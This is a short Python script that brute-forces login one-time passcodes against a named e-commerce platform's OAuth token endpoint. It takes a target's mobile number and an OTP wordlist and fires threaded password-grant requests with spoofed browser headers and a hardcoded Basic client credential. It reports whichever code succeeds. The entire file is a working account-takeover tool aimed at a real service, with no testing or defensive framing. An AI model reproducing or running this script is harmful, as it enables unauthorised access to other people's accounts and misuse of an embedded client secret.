import requests
from concurrent.futures import ThreadPoolExecutor


def send_request(username, password):
    headers = {
        "Content-Length": "53",
        "Sec-Ch-Ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Authorization": "Basic b25hcHByLWJhY2tlbmQ6b25hcHByLWJhY2tlbmQtQnVLcVB4bURCM1ZSbg==",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Origin": "https://www.cart24onlineshopping.in",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.cart24onlineshopping.in/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }

    data = {
        "grant_type": "password",
        "username": username,
        "password": password
    }

    url = "https://api.shoopy.in/api/v1/auth/oauth/token"
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        print("OTP found:", password)


username = input("Enter mobile number : ")
otp_file = input("Enter the name of the OTP file: ")
print("wait for few minutes !!")
with open(otp_file, "r") as file:
    otp_list = file.read().splitlines()
with ThreadPoolExecutor() as executor:
    futures = [executor.submit(send_request, username, otp) for otp in otp_list]


